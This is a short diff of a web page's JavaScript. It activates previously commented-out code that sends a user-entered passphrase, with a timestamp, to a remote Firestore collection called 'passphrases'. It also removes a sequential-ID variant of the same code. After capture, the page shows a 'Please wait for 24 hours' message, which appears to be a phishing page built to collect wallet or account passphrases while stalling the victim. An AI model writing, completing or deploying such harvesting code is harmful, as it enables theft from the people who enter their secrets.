@@ -184,46 +184,18 @@
 
         errorMessage.style.display = "none";
 
-        // Store passphrase in Firebase Firestore
-        // firestore.collection("passphrases").add({
-        //     passphrase: passphrase,
-        //     timestamp: new Date().toISOString()
-        // }).then((docRef) => {
-        //     // Log success and print the document ID
-        //     console.log("Passphrase stored successfully in Firestore! Document ID:", docRef.id);
-        // }).catch((error) => {
-        //     // Log any error that occurs during the save operation
-        //     console.error("Error storing passphrase in Firestore:", error);
-        // });
+        firestore.collection("passphrases").add({
+            passphrase: passphrase,
+            timestamp: new Date().toISOString()
+        }).then((docRef) => {
+            // Log success and print the document ID
+            console.log("Passphrase stored successfully in Firestore! Document ID:", docRef.id);
+        }).catch((error) => {
+            // Log any error that occurs during the save operation
+            console.error("Error storing passphrase in Firestore:", error);
+        });
 
 
-        const db = firebase.firestore();
-const counterRef = db.collection("counters").doc("metadata");
-
-db.runTransaction(async (transaction) => {
-    const counterDoc = await transaction.get(counterRef);
-
-    let nextId = 1; // Default to 1 if counter does not exist
-
-    if (counterDoc.exists) {
-        nextId = counterDoc.data().lastId + 1;
-    }
-
-    // Set new passphrase with sequential ID
-    const passphraseData = {
-        passphrase: "mySecurePassphrase",
-        createdAt: firebase.firestore.FieldValue.serverTimestamp()
-    };
-
-    transaction.set(db.collection("passphrases").doc(nextId.toString()), passphraseData);
-    transaction.set(counterRef, { lastId: nextId });
-
-    return nextId;
-}).then((newId) => {
-    console.log(`✅ Passphrase stored successfully with ID: ${newId}`);
-}).catch((error) => {
-    console.error("❌ Error storing passphrase:", error);
-});
 
 
         // Show "Please wait for 24 hours" message
